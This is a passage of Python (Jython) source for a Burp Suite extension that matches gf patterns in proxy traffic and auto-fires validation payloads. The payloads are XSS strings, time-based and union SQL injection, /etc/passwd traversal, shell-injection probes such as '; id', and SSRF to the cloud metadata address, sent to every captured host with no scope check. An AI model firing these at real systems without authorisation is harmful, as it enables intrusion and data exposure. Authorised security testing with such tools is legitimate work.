# -*- coding: utf-8 -*-
# =============================================================================
#  GF Analyzer + The Trigger for Burp Suite Community
#  Single-file Jython extension that replicates tomnomnom's 'gf' tool with
#  integrated auto-exploit validation ("The Trigger").
#
#  Features:
#   - One tab per pattern with live count badges
#   - Master-detail UI: unique endpoints on left, individual variants on right
#   - JSON body parsing with synthetic key=value targets
#   - THE TRIGGER: auto-validates findings with canary payloads
#   - Confirmed findings get their own "CONFIRMED-*" tabs
#   - Native Burp Request/Response viewers with Baseline/Polluted toggle
#   - Right-click "Send to Repeater" + "Copy URL"
#   - Export findings to CSV
# =============================================================================

from burp import (IBurpExtender, ITab, IContextMenuFactory, IMessageEditorController,
                  IHttpRequestResponse, IHttpService)
from javax.swing import (JPanel, JTabbedPane, JTable, JScrollPane, JSplitPane,
                         JButton, JLabel, JTextField, JFileChooser, JOptionPane,
                         JPopupMenu, JMenuItem, SwingUtilities,
                         ListSelectionModel, BorderFactory, JToolBar, JComboBox,
                         RowFilter, JToggleButton)
from javax.swing.table import DefaultTableModel
from javax.swing.event import ListSelectionListener, CaretListener, ChangeListener
from java.awt import BorderLayout, Dimension
from java.awt.datatransfer import StringSelection
from java.awt import Toolkit
from java.awt.event import MouseAdapter, ActionListener
from java.io import File, FileOutputStream, OutputStreamWriter
from java.lang import Runnable, Thread, Integer, String, System
from java.util import ArrayList
import re
import json
import os
import threading


# -----------------------------------------------------------------------------
# Swing helper: invoke on EDT
# -----------------------------------------------------------------------------
class SwingRun(Runnable):
    def __init__(self, func):
        self.func = func
    def run(self):
        self.func()


# -----------------------------------------------------------------------------
# Table models
# -----------------------------------------------------------------------------
class UniqueTableModel(DefaultTableModel):
    def __init__(self):
        DefaultTableModel.__init__(self,
            ["#", "URL", "Method", "Status", "Length", "Matched Params", "Hits", "Match"], 0)

    def getColumnClass(self, col):
        if col in (0, 3, 4, 6):
            return Integer
        return String


class VariantTableModel(DefaultTableModel):
    def __init__(self):
        DefaultTableModel.__init__(self,
            ["#", "Status", "Length", "All Params", "Match"], 0)

    def getColumnClass(self, col):
        if col in (0, 1, 2):
            return Integer
        return String


class ConfirmedTableModel(DefaultTableModel):
    def __init__(self):
        DefaultTableModel.__init__(self,
            ["#", "URL", "Method", "Vuln", "Payload", "B-Status", "P-Status",
             "B-Len", "P-Len", "Evidence", "Confidence"], 0)

    def getColumnClass(self, col):
        if col in (0, 5, 6, 7, 8):
            return Integer
        return String


# -----------------------------------------------------------------------------
# Data holders
# -----------------------------------------------------------------------------
class TabData:
    def __init__(self, name):
        self.name = name
        self.uniques = {}
        self.unique_entries = []
        self.variant_instances = []

        self.unique_model = UniqueTableModel()
        self.unique_table = JTable(self.unique_model)
        self.unique_table.setAutoCreateRowSorter(True)
        self.unique_table.setSelectionMode(ListSelectionModel.SINGLE_SELECTION)
        self.unique_table.setAutoResizeMode(JTable.AUTO_RESIZE_OFF)

        self.variant_model = VariantTableModel()
        self.variant_table = JTable(self.variant_model)
        self.variant_table.setAutoCreateRowSorter(True)
        self.variant_table.setSelectionMode(ListSelectionModel.SINGLE_SELECTION)
        self.variant_table.setAutoResizeMode(JTable.AUTO_RESIZE_OFF)

        self.split_pane = JSplitPane(JSplitPane.HORIZONTAL_SPLIT,
                                      JScrollPane(self.unique_table),
                                      JScrollPane(self.variant_table))
        self.split_pane.setResizeWeight(0.65)


class ConfirmedTabData:
    def __init__(self, name):
        self.name = name
        self.findings = []
        self.model = ConfirmedTableModel()
        self.table = JTable(self.model)
        self.table.setAutoCreateRowSorter(True)
        self.table.setSelectionMode(ListSelectionModel.SINGLE_SELECTION)
        self.table.setAutoResizeMode(JTable.AUTO_RESIZE_OFF)
        self.scroll = JScrollPane(self.table)


# -----------------------------------------------------------------------------
# Background scanner
# -----------------------------------------------------------------------------
class ScanRunner(Runnable):
    def __init__(self, extender):
        self.extender = extender

    def run(self):
        try:
            history = self.extender.callbacks.getProxyHistory()
            total = len(history)
            for i, msg in enumerate(history):
                self.extender.analyze_messages([msg])
                if i % 200 == 0:
                    SwingUtilities.invokeLater(SwingRun(
                        lambda i=i: self.extender.status.setText(
                            "Scanning %d / %d ..." % (i, total))))
            SwingUtilities.invokeLater(SwingRun(
                lambda: self.extender.status.setText(
                    "Scan complete - %d items processed" % total)))
        except Exception as e:
            SwingUtilities.invokeLater(SwingRun(
                lambda: self.extender.status.setText("Scan error: %s" % str(e))))
        finally:
            SwingUtilities.invokeLater(SwingRun(
                lambda: self.extender.scan_btn.setEnabled(True)))


# -----------------------------------------------------------------------------
# Selection listeners
# -----------------------------------------------------------------------------
class UniqueSelectionListener(ListSelectionListener):
    def __init__(self, extender, tab):
        self.extender = extender
        self.tab = tab
    def valueChanged(self, event):
        if event.getValueIsAdjusting():
            return
        row = self.tab.unique_table.getSelectedRow()
        if row != -1:
            model_row = self.tab.unique_table.convertRowIndexToModel(row)
            if 0 <= model_row < len(self.tab.unique_entries):
                key = self.tab.unique_entries[model_row]
                self.extender._populate_variants(self.tab, key)


class VariantSelectionListener(ListSelectionListener):
    def __init__(self, extender, tab):
        self.extender = extender
        self.tab = tab
    def valueChanged(self, event):
        if event.getValueIsAdjusting():
            return
        row = self.tab.variant_table.getSelectedRow()
        if row != -1:
            model_row = self.tab.variant_table.convertRowIndexToModel(row)
            if 0 <= model_row < len(self.tab.variant_instances):
                self.extender._show_finding(self.tab.variant_instances[model_row])


class ConfirmedSelectionListener(ListSelectionListener):
    def __init__(self, extender, ctab):
        self.extender = extender
        self.ctab = ctab
    def valueChanged(self, event):
        if event.getValueIsAdjusting():
            return
        row = self.ctab.table.getSelectedRow()
        if row != -1:
            model_row = self.ctab.table.convertRowIndexToModel(row)
            if 0 <= model_row < len(self.ctab.findings):
                self.extender._show_confirmed(self.ctab.findings[model_row])


# -----------------------------------------------------------------------------
# Popup listeners
# -----------------------------------------------------------------------------
class VariantPopupListener(MouseAdapter):
    def __init__(self, extender, tab):
        self.extender = extender
        self.tab = tab
    def mousePressed(self, e):
        if e.isPopupTrigger():
            self._show(e)
    def mouseReleased(self, e):
        if e.isPopupTrigger():
            self._show(e)
    def _show(self, e):
        popup = JPopupMenu()
        item_rep = JMenuItem("Send to Repeater")
        item_rep.addActionListener(SendVariantToRepeaterListener(self.extender, self.tab))
        popup.add(item_rep)
        item_url = JMenuItem("Copy URL")
        item_url.addActionListener(CopyVariantUrlListener(self.extender, self.tab))
        popup.add(item_url)
        popup.show(e.getComponent(), e.getX(), e.getY())


class ConfirmedPopupListener(MouseAdapter):
    def __init__(self, extender, ctab):
        self.extender = extender
        self.ctab = ctab
    def mousePressed(self, e):
        if e.isPopupTrigger():
            self._show(e)
    def mouseReleased(self, e):
        if e.isPopupTrigger():
            self._show(e)
    def _show(self, e):
        popup = JPopupMenu()
        b = JMenuItem("Send Baseline to Repeater")
        b.addActionListener(SendConfirmedBaselineListener(self.extender, self.ctab))
        popup.add(b)
        p = JMenuItem("Send Trigger to Repeater")
        p.addActionListener(SendConfirmedTriggerListener(self.extender, self.ctab))
        popup.add(p)
        c = JMenuItem("Copy URL")
        c.addActionListener(CopyConfirmedUrlListener(self.extender, self.ctab))
        popup.add(c)
        popup.show(e.getComponent(), e.getX(), e.getY())


class SendVariantToRepeaterListener(ActionListener):
    def __init__(self, extender, tab):
        self.extender = extender
        self.tab = tab
    def actionPerformed(self, event):
        self.extender._send_variant_to_repeater(self.tab)

class CopyVariantUrlListener(ActionListener):
    def __init__(self, extender, tab):
        self.extender = extender
        self.tab = tab
    def actionPerformed(self, event):
        self.extender._copy_variant_url(self.tab)

class SendConfirmedBaselineListener(ActionListener):
    def __init__(self, extender, ctab):
        self.extender = extender
        self.ctab = ctab
    def actionPerformed(self, event):
        self.extender._send_confirmed_baseline(self.ctab)

class SendConfirmedTriggerListener(ActionListener):
    def __init__(self, extender, ctab):
        self.extender = extender
        self.ctab = ctab
    def actionPerformed(self, event):
        self.extender._send_confirmed_trigger(self.ctab)

class CopyConfirmedUrlListener(ActionListener):
    def __init__(self, extender, ctab):
        self.extender = extender
        self.ctab = ctab
    def actionPerformed(self, event):
        self.extender._copy_confirmed_url(self.ctab)


# -----------------------------------------------------------------------------
# Other listeners
# -----------------------------------------------------------------------------
class FilterListener(CaretListener):
    def __init__(self, extender):
        self.extender = extender
    def caretUpdate(self, event):
        self.extender._apply_filter()

class TabChangeListener(ChangeListener):
    def __init__(self, extender):
        self.extender = extender
    def stateChanged(self, event):
        self.extender._on_tab_changed()

class JumpActionListener(ActionListener):
    def __init__(self, extender):
        self.extender = extender
    def actionPerformed(self, event):
        self.extender._on_jump(event)

class ContextMenuListener(ActionListener):
    def __init__(self, extender, invocation):
        self.extender = extender
        self.invocation = invocation
    def actionPerformed(self, event):
        self.extender.analyze_messages(self.invocation.getSelectedMessages())

class ToggleListener(ActionListener):
    def __init__(self, extender):
        self.extender = extender
    def actionPerformed(self, event):
        self.extender._on_toggle()


# -----------------------------------------------------------------------------
# Main extension
# -----------------------------------------------------------------------------
class BurpExtender(IBurpExtender, ITab, IContextMenuFactory, IMessageEditorController):

    STATIC_EXTS = {
        'js', 'css', 'svg', 'png', 'jpg', 'jpeg', 'gif', 'ico', 'woff', 'woff2',
        'ttf', 'eot', 'mp4', 'webm', 'pdf', 'zip', 'tar', 'gz', 'bz2', '7z',
        'bmp', 'webp', 'wav', 'mp3', 'ogg', 'm4a', 'flac', 'avi', 'mov', 'wmv',
        'exe', 'dll', 'so', 'dmg', 'pkg', 'deb', 'rpm', 'msi', 'jar', 'war', 'ear',
        'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx', 'swf', 'flv', 'mkv'
    }

    ALLOWED_PARAM_TYPES = {0, 1, 3, 4, 5, 6}

    TRIGGER_PAYLOADS = {
        'redirect': {
            'payloads': ['https://gftrigger.example.com', 'http://gftrigger.example.com', '//gftrigger.example.com'],
            'check': 'redirect',
            'vuln_name': 'OpenRedirect'
        },
        'ssrf': {
            'payloads': ['http://gftrigger.example.com', 'https://gftrigger.example.com', 'http://169.254.169.254/latest/meta-data/'],
            'check': 'ssrf',
            'vuln_name': 'SSRF'
        },
        'xss': {
            'payloads': ["<svg+onload=alert(1)>", "'\"><img+src=dflkajsf+onerror=alert(1)>",
                        "\"><svg onload=alert(1)>", "javascript:alert(1)"],
            'check': 'xss',
            'vuln_name': 'XSS'
        },
        'sqli': {
            'payloads': ["'+AND+(SELECT*FROM+(SELECT(SLEEP(5)))a)+--",
                        "' OR '1'='1", "1' ORDER BY 9999 -- ",
                        "1 UNION SELECT null,null,null -- "],
            'check': 'sqli',
            'vuln_name': 'SQLi'
        },
        'lfi': {
            'payloads': ['../../../../../../../../../etc/passwd', '....//....//....//....//....//....//etc/passwd''%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2e%2e%2fpasswd',
                        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                        'C:\\Windows\\win.ini'],
            'check': 'lfi',
            'vuln_name': 'LFI'
        },
        'rce': {
            'payloads': ['; id', '| id', '` id`', '$(id)', '${IFS}id'],
            'check': 'rce',
            'vuln_name': 'RCE'
        },
        'idor': {
            'payloads': ['1', '2', '0', '-1', '999999','6666'],
            'check': 'idor',
            'vuln_name': 'IDOR'
        }
    }

    def registerExtenderCallbacks(self, callbacks):
        self.callbacks = callbacks
        self.helpers = callbacks.getHelpers()
        self.callbacks.setExtensionName("GF + Trigger")

        self.patterns = {}
        self.tabs_data = {}
        self.confirmed_tabs = {}
        self.confirmed_findings = []
        self.confirmed_counter = 0
        self.findings_counter = 0
        self.current_finding = None
        self.current_confirmed = None
        self.viewing_baseline = False
        self._populating_combo = False
        self._lock = threading.Lock()

        self._build_ui()

        self.callbacks.addSuiteTab(self)
        self.callbacks.registerContextMenuFactory(self)

        default_dir = os.path.join(System.getProperty("user.home"), ".gf")
        self.dir_field.setText(default_dir)
        self._load_and_refresh(default_dir)

        print("[GF + Trigger] Loaded. Default patterns dir: %s" % default_dir)

    def _build_ui(self):
        self.main_panel = JPanel(BorderLayout())
        self.main_panel.setBorder(BorderFactory.createEmptyBorder(4, 4, 4, 4))

        toolbar = JToolBar()
        toolbar.setFloatable(False)

        toolbar.add(JLabel("GF Dir:"))
        self.dir_field = JTextField(24)
        toolbar.add(self.dir_field)

        toolbar.add(JButton("Browse", actionPerformed=self._on_browse))
        toolbar.add(JButton("Reload", actionPerformed=self._on_reload))
        toolbar.addSeparator(Dimension(8, 0))

        self.scan_btn = JButton("Scan Proxy History", actionPerformed=self._on_scan)
        toolbar.add(self.scan_btn)
        toolbar.add(JButton("Export CSV", actionPerformed=self._on_export))
        toolbar.add(JButton("Clear", actionPerformed=self._on_clear))
        toolbar.addSeparator(Dimension(8, 0))

        self.toggle_btn = JToggleButton("View Baseline", actionPerformed=ToggleListener(self))
        toolbar.add(self.toggle_btn)
        toolbar.addSeparator(Dimension(8, 0))

        toolbar.add(JLabel("Jump:"))
        self.jump_combo = JComboBox()
        self.jump_combo.setPreferredSize(Dimension(120, 24))
        self.jump_combo.addActionListener(JumpActionListener(self))
        toolbar.add(self.jump_combo)

        toolbar.add(JLabel("Filter:"))
        self.filter_field = JTextField(10)
        self.filter_field.addCaretListener(FilterListener(self))
        toolbar.add(self.filter_field)

        self.main_panel.add(toolbar, BorderLayout.NORTH)

        self.tab_pane = JTabbedPane()
        self.tab_pane.setTabLayoutPolicy(JTabbedPane.SCROLL_TAB_LAYOUT)
        self.tab_pane.addChangeListener(TabChangeListener(self))

        self.req_editor = self.callbacks.createMessageEditor(self, False)
        self.resp_editor = self.callbacks.createMessageEditor(self, False)

        req_wrap = JPanel(BorderLayout())
        req_wrap.setBorder(BorderFactory.createTitledBorder("Request"))
        req_wrap.add(self.req_editor.getComponent(), BorderLayout.CENTER)

        resp_wrap = JPanel(BorderLayout())
        resp_wrap.setBorder(BorderFactory.createTitledBorder("Response"))
        resp_wrap.add(self.resp_editor.getComponent(), BorderLayout.CENTER)

        bottom_split = JSplitPane(JSplitPane.HORIZONTAL_SPLIT, req_wrap, resp_wrap)
        bottom_split.setResizeWeight(0.5)
        bottom_split.setPreferredSize(Dimension(0, 360))

        center_split = JSplitPane(JSplitPane.VERTICAL_SPLIT, self.tab_pane, bottom_split)
        center_split.setResizeWeight(0.60)

        self.main_panel.add(center_split, BorderLayout.CENTER)

        self.status = JLabel("Ready")
        self.main_panel.add(self.status, BorderLayout.SOUTH)

    def getTabCaption(self):
        return "GF + Trigger"

    def getUiComponent(self):
        return self.main_panel

    def _load_and_refresh(self, path):
        self._load_patterns(path)
        self._rebuild_tabs()

    def _load_patterns(self, directory):
        self.patterns = {}
        if not os.path.isdir(directory):
            return
        for filename in sorted(os.listdir(directory)):
            if filename.endswith('.json') or filename.endswith('.js'):
                full = os.path.join(directory, filename)
                try:
                    with open(full, 'r') as fh:
                        raw = fh.read()
                    data = json.loads(raw)
                    name = filename.rsplit('.', 1)[0]

                    flags = 0
                    gf_flags = data.get('flags', '')
                    if 'i' in gf_flags:
                        flags |= re.IGNORECASE
                    if 'm' in gf_flags:
                        flags |= re.MULTILINE
                    if 's' in gf_flags:
                        flags |= re.DOTALL

                    regex_list = []
                    if 'pattern' in data:
                        regex_list.append(re.compile(data['pattern'], flags))
                    if 'patterns' in data:
                        for p in data['patterns']:
                            regex_list.append(re.compile(p, flags))

                    if regex_list:
                        self.patterns[name] = regex_list
                except Exception as e:
                    print("[GF + Trigger] Failed to load %s: %s" % (filename, str(e)))

    def _rebuild_tabs(self):
        self.tab_pane.removeAll()
        self.tabs_data.clear()
        self.confirmed_tabs.clear()
        self.confirmed_findings = []
        self.confirmed_counter = 0
        self.findings_counter = 0
        self.current_finding = None
        self.current_confirmed = None

        self._populating_combo = True
        self.jump_combo.removeAllItems()

        empty = self.helpers.stringToBytes("")
        self.req_editor.setMessage(empty, True)
        self.resp_editor.setMessage(empty, False)

        # GF pattern tabs
        for name in sorted(self.patterns.keys()):
            self.jump_combo.addItem(name)
            tab = TabData(name)
            self.tabs_data[name] = tab

            um = tab.unique_table.getColumnModel()
            um.getColumn(0).setPreferredWidth(40)
            um.getColumn(1).setPreferredWidth(700)
            um.getColumn(2).setPreferredWidth(230)
            um.getColumn(3).setPreferredWidth(190)
            um.getColumn(4).setPreferredWidth(150)
            um.getColumn(5).setPreferredWidth(380)
            um.getColumn(6).setPreferredWidth(60)
            um.getColumn(7).setPreferredWidth(450)

            vm = tab.variant_table.getColumnModel()
            vm.getColumn(0).setPreferredWidth(40)
            vm.getColumn(1).setPreferredWidth(190)
            vm.getColumn(2).setPreferredWidth(150)
            vm.getColumn(3).setPreferredWidth(500)
            vm.getColumn(4).setPreferredWidth(450)

            tab.unique_table.getSelectionModel().addListSelectionListener(UniqueSelectionListener(self, tab))
            tab.variant_table.getSelectionModel().addListSelectionListener(VariantSelectionListener(self, tab))
            tab.variant_table.addMouseListener(VariantPopupListener(self, tab))

            self.tab_pane.addTab(name, tab.split_pane)

        # Pre-create confirmed tabs
        for trigger_key, trigger_info in self.TRIGGER_PAYLOADS.items():
            ctab = ConfirmedTabData(trigger_info['vuln_name'])
            self.confirmed_tabs[trigger_key] = ctab

            cm = ctab.table.getColumnModel()
            cm.getColumn(0).setPreferredWidth(40)
            cm.getColumn(1).setPreferredWidth(500)
            cm.getColumn(2).setPreferredWidth(100)
            cm.getColumn(3).setPreferredWidth(100)
            cm.getColumn(4).setPreferredWidth(300)
            cm.getColumn(5).setPreferredWidth(60)
            cm.getColumn(6).setPreferredWidth(60)
            cm.getColumn(7).setPreferredWidth(60)
            cm.getColumn(8).setPreferredWidth(60)
            cm.getColumn(9).setPreferredWidth(350)
            cm.getColumn(10).setPreferredWidth(90)

            ctab.table.getSelectionModel().addListSelectionListener(ConfirmedSelectionListener(self, ctab))
            ctab.table.addMouseListener(ConfirmedPopupListener(self, ctab))

            self.tab_pane.addTab("CONFIRMED-%s" % trigger_info['vuln_name'], ctab.scroll)

        self._populating_combo = False
        self._update_status()

    def _extract_json_targets(self, msg, req_info):
        targets = []
        headers = req_info.getHeaders()
        content_type = ""
        for h in headers:
            hl = h.lower()
            if hl.startswith("content-type:"):
                content_type = hl.split(":", 1)[1].strip()
                break

        if "json" not in content_type:
            return targets

        body_offset = req_info.getBodyOffset()
        req_bytes = msg.getRequest()
        if req_bytes is None or len(req_bytes) <= body_offset:
            return targets

        body_bytes = req_bytes[body_offset:]
        if not body_bytes:
            return targets

        try:
            body_str = self.helpers.bytesToString(body_bytes)
            data = json.loads(body_str)
            if isinstance(data, dict):
                for k, v in data.items():
                    if isinstance(v, (str, int, float, bool)):
                        targets.append((k, str(v)))
                    elif v is None:
                        targets.append((k, ""))
                    elif isinstance(v, list):
                        targets.append((k, json.dumps(v)))
                        for item in v:
                            if isinstance(item, (str, int, float, bool)):
                                targets.append((k, str(item)))
                            elif item is None:
                                targets.append((k, ""))
                    elif isinstance(v, dict):
                        targets.append((k, json.dumps(v)))
        except Exception:
            pass

        return targets

    def analyze_messages(self, messages):
        for msg in messages:
            try:
                if msg.getResponse() is None:
                    continue

                req_info = self.helpers.analyzeRequest(msg)
                url = req_info.getUrl()
                url_str = url.toString()
                method = req_info.getMethod()

                resp_info = self.helpers.analyzeResponse(msg.getResponse())
                status = resp_info.getStatusCode()
                length = len(msg.getResponse())

                # Static file skip
                path = str(url.getPath())
                last_seg = path.split('/')[-1]
                if '.' in last_seg:
                    ext = last_seg.split('.')[-1].lower().split('?')[0].split('#')[0]
                    if ext.isalpha() and len(ext) <= 6 and ext in self.STATIC_EXTS:
                        continue

                mime = (resp_info.getStatedMimeType() or "") + " " + (resp_info.getInferredMimeType() or "")
                mime = mime.lower()
                static_mimes = [
                    'image/', 'text/css', 'application/javascript',
                    'application/x-javascript', 'text/javascript',
                    'font/', 'application/pdf', 'video/', 'audio/'
                ]
                if any(sm in mime for sm in static_mimes):
                    continue

                # Build grep parameters
                grep_params = []

                all_params = req_info.getParameters()
                for p in all_params:
                    pt = int(p.getType())
                    if pt in self.ALLOWED_PARAM_TYPES:
                        grep_params.append((p.getName(), p.getValue() or "", pt == 6))

                json_targets = self._extract_json_targets(msg, req_info)
                for jname, jval in json_targets:
                    grep_params.append((jname, jval, True))

                if not grep_params:
                    continue

                all_param_strs = []
                for pname, pval, _ in grep_params:
                    all_param_strs.append("%s=%s" % (pname, pval))
                full_param_values = ", ".join(all_param_strs)

                # Pattern matching
                for name, regex_list in self.patterns.items():
                    matches = []
                    matched_param_names = set()

                    for regex in regex_list:
                        for pname, pval, is_json in grep_params:
                            targets = [pname + "=" + pval, pname]
                            if pval:
                                targets.append(pval)
                            if is_json:
                                targets.append('"%s":"%s"' % (pname, pval))
                                targets.append('"%s":' % pname)
                                targets.append('"%s"' % pname)

                            for text in targets:
                                for m in regex.finditer(text):
                                    matches.append(m.group(0))
                                    matched_param_names.add(pname)
                                    if len(matches) >= 3:
                                        break
                                if len(matches) >= 3:
                                    break
                            if len(matches) >= 3:
                                break
                        if len(matches) >= 3:
                            break

                    if matches:
                        match_str = " | ".join(matches[:3])
                        matched_str = ", ".join(sorted(matched_param_names))
                        host = str(url.getHost())
                        path = str(url.getPath())
                        key = (host, path, method)
                        self._add_finding(name, url_str, method, status, length,
                                          matched_str, full_param_values, match_str, msg, key)

                        # THE TRIGGER
                        self._trigger_validation(name, url_str, method, msg, req_info,
                                                  grep_params, matched_param_names)

            except Exception as e:
                print("[GF + Trigger] analysis error: %s" % str(e))

    def _add_finding(self, name, url, method, status, length,
                     matched_params, full_params, match_str, msg, key):
        tab = self.tabs_data.get(name)
        if tab is None:
            return

        with self._lock:
            self.findings_counter += 1
            finding_id = self.findings_counter

            instance = {
                'id': finding_id,
                'url': url,
                'method': method,
                'status': status,
                'length': length,
                'param': matched_params,
                'full_params': full_params,
                'match': match_str,
                'message': msg
            }

            if key not in tab.uniques:
                tab.uniques[key] = {
                    'instances': [instance],
                    'url': url,
                    'method': method,
                    'status': status,
                    'length': length,
                    'param': matched_params,
                    'match': match_str
                }
                SwingUtilities.invokeLater(SwingRun(lambda: self._add_unique_row(tab, key)))
            else:
                tab.uniques[key]['instances'].append(instance)
                SwingUtilities.invokeLater(SwingRun(lambda: self._update_unique_hits(tab, key)))

    def _add_unique_row(self, tab, key):
        data = tab.uniques[key]
        tab.unique_entries.append(key)
        tab.unique_model.addRow([
            data['instances'][0]['id'],
            data['url'],
            data['method'],
            data['status'],
            data['length'],
            data['param'],
            1,
            data['match']
        ])
        self._update_tab_title(tab.name)
        self._update_status()

    def _update_unique_hits(self, tab, key):
        try:
            row_idx = tab.unique_entries.index(key)
            hits = len(tab.uniques[key]['instances'])
            tab.unique_model.setValueAt(hits, row_idx, 6)
        except ValueError:
            pass

    def _populate_variants(self, tab, key):
        while tab.variant_model.getRowCount() > 0:
            tab.variant_model.removeRow(0)
        tab.variant_instances = []

        instances = tab.uniques[key]['instances']
        for inst in instances:
            tab.variant_instances.append(inst)
            tab.variant_model.addRow([
                inst['id'],
                inst['status'],
                inst['length'],
                inst['full_params'],
                inst['match']
            ])

        if tab.variant_model.getRowCount() > 0:
            tab.variant_table.setRowSelectionInterval(0, 0)

    def _update_tab_title(self, name):
        tab = self.tabs_data.get(name)
        count = sum(len(u['instances']) for u in tab.uniques.values())
        title = "%s (%d)" % (name, count) if count else name
        idx = self.tab_pane.indexOfComponent(tab.split_pane)
        if idx != -1:
            self.tab_pane.setTitleAt(idx, title)

    def _show_finding(self, finding):
        self.current_finding = finding
        self.current_confirmed = None
        self.viewing_baseline = False
        self.toggle_btn.setSelected(False)
        self.toggle_btn.setEnabled(False)
        msg = finding['message']
        req = msg.getRequest() if msg.getRequest() else self.helpers.stringToBytes("")
        resp = msg.getResponse() if msg.getResponse() else self.helpers.stringToBytes("")
        self.req_editor.setMessage(req, True)
        self.resp_editor.setMessage(resp, False)
        self.status.setText("GF Finding #%d | %s" % (finding['id'], finding['url']))

    # -------------------------------------------------------------------------
    # THE TRIGGER
    # -------------------------------------------------------------------------
    def _trigger_validation(self, pattern_name, url, method, msg, req_info,
                            grep_params, matched_params):
        trigger_key = None
        for tk, ti in self.TRIGGER_PAYLOADS.items():
            if tk.lower() in pattern_name.lower():
                trigger_key = tk
                break

        if not trigger_key:
            return

        trigger_info = self.TRIGGER_PAYLOADS[trigger_key]
        service = msg.getHttpService()
        headers = req_info.getHeaders()
        body_offset = req_info.getBodyOffset()
        req_bytes = msg.getRequest()
        body_bytes = req_bytes[body_offset:] if req_bytes else None

        for pname, pval, is_json in grep_params:
            if pname not in matched_params:
                continue

            for payload in trigger_info['payloads']:
                try:
                    new_req_bytes = self._inject_payload(req_bytes, body_offset,
                                                        headers, body_bytes,
                                                        pname, pval, payload, is_json)
                    if new_req_bytes is None:
                        continue

                    result_msg = self.callbacks.makeHttpRequest(service, new_req_bytes)
                    if result_msg is None or result_msg.getResponse() is None:
                        continue

                    trigger_resp = result_msg.getResponse()
                    baseline_resp = msg.getResponse()

                    evidence = self._analyze_trigger(trigger_key, trigger_resp,
                                                      baseline_resp, payload)

                    if evidence:
                        self._add_confirmed(trigger_key, url, method,
                                           trigger_info['vuln_name'], payload,
                                           baseline_resp, trigger_resp,
                                           req_bytes, new_req_bytes,
                                           service, evidence)

                    Thread.sleep(50)

                except Exception as e:
                    print("[Trigger] Error: %s" % str(e))

    def _inject_payload(self, req_bytes, body_offset, headers, body_bytes,
                        pname, pval, payload, is_json):
        if req_bytes is None:
            return None

        req_str = self.helpers.bytesToString(req_bytes)

        if body_bytes is None or len(body_bytes) == 0:
            old = "%s=%s" % (pname, pval)
            new = "%s=%s" % (pname, payload)
            if old in req_str:
                new_req_str = req_str.replace(old, new, 1)
                return self.helpers.stringToBytes(new_req_str)
            if pval == "":
                old2 = "%s=" % pname
                new2 = "%s=%s" % (pname, payload)
                if old2 in req_str:
                    new_req_str = req_str.replace(old2, new2, 1)
                    return self.helpers.stringToBytes(new_req_str)
            return None

        if is_json:
            body_str = self.helpers.bytesToString(body_bytes)
            try:
                data = json.loads(body_str)
                if isinstance(data, dict) and pname in data:
                    data[pname] = payload
                    new_body = self.helpers.stringToBytes(json.dumps(data))
                    return self.helpers.buildHttpMessage(headers, new_body)
                new_body_str = body_str.replace('"%s":"%s"' % (pname, pval),
                                                 '"%s":"%s"' % (pname, payload), 1)
                if new_body_str != body_str:
                    return self.helpers.buildHttpMessage(headers,
                        self.helpers.stringToBytes(new_body_str))
            except Exception:
                pass

        body_str = self.helpers.bytesToString(body_bytes)
        old = "%s=%s" % (pname, pval)
        new = "%s=%s" % (pname, payload)
        if old in body_str:
            new_body_str = body_str.replace(old, new, 1)
            return self.helpers.buildHttpMessage(headers,
                self.helpers.stringToBytes(new_body_str))

        return None

    def _analyze_trigger(self, trigger_key, trigger_resp, baseline_resp, payload):
        trigger_status = self.helpers.analyzeResponse(trigger_resp).getStatusCode()
        trigger_body = self.helpers.bytesToString(trigger_resp)
        baseline_body = self.helpers.bytesToString(baseline_resp) if baseline_resp else ""
        baseline_status = self.helpers.analyzeResponse(baseline_resp).getStatusCode() if baseline_resp else 0

        evidence = []
        confidence = "Low"

        if trigger_key in ('redirect',):
            if trigger_status in (301, 302, 307, 308):
                trigger_headers = self.helpers.analyzeResponse(trigger_resp).getHeaders()
                for h in trigger_headers:
                    hl = h.lower()
                    if hl.startswith("location:") and "gftrigger.example.com" in hl:
                        evidence.append("Redirect to payload: %s" % h)
                        confidence = "High"
                        break

        if trigger_key in ('ssrf',):
            if "169.254.169.254" in payload:
                if "instance-id" in trigger_body or "ami-id" in trigger_body:
                    evidence.append("AWS metadata reflected")
                    confidence = "Critical"
                elif "404" in trigger_body and "not found" in trigger_body.lower():
                    evidence.append("Internal 404 (SSRF reachable)")
                    confidence = "High"
            if "gftrigger.example.com" in payload:
                evidence.append("SSRF payload sent (verify DNS callback externally)")
                confidence = "Medium"

        if trigger_key in ('xss',):
            if payload in trigger_body:
                evidence.append("Payload reflected unencoded")
                confidence = "High"
            cleaned = payload.replace("<", "").replace(">", "").replace("\"", "")
            if cleaned in trigger_body and payload not in trigger_body:
                evidence.append("Payload partially filtered")
                confidence = "Medium"

        if trigger_key in ('sqli',):
            sql_errors = ["sql syntax", "mysql_fetch", "pg_query", "ora-",
                         "unclosed quotation", "odbc error", "syntax error"]
            for err in sql_errors:
                if err in trigger_body.lower() and err not in baseline_body.lower():
                    evidence.append("SQL error: %s" % err)
                    confidence = "High"
                    break
            if "sleep" in payload.lower() or "delay" in payload.lower():
                evidence.append("Time-based payload sent (check response time)")
                confidence = "Medium"
            if trigger_status == baseline_status:
                diff = len(trigger_body) - len(baseline_body)
                if abs(diff) > 200:
                    evidence.append("Response length changed by %d" % diff)
                    confidence = "Medium"

        if trigger_key in ('lfi',):
            lfi_indicators = ["root:", "bin/bash", "windows", "boot loader",
                            "etc/passwd", "win.ini", "system32"]
            for ind in lfi_indicators:
                if ind in trigger_body.lower() and ind not in baseline_body.lower():
                    evidence.append("File content reflected: %s" % ind)
                    confidence = "High"
                    break
            if "failed to open stream" in trigger_body.lower() or \
               "no such file" in trigger_body.lower():
                evidence.append("File access error (path reachable)")
                confidence = "Medium"

        if trigger_key in ('rce',):
            rce_indicators = ["uid=", "gid=", "root", "administrator",
                            "nt authority", "windows nt"]
            for ind in rce_indicators:
                if ind in trigger_body.lower() and ind not in baseline_body.lower():
                    evidence.append("Command output: %s" % ind)
                    confidence = "Critical"
                    break
            if "unable to execute" in trigger_body.lower() or \
               "command not found" in trigger_body.lower():
                evidence.append("Command execution error")
                confidence = "High"

        if trigger_key in ('idor',):
            if trigger_status == 200 and baseline_status == 200:
                diff = len(trigger_body) - len(baseline_body)
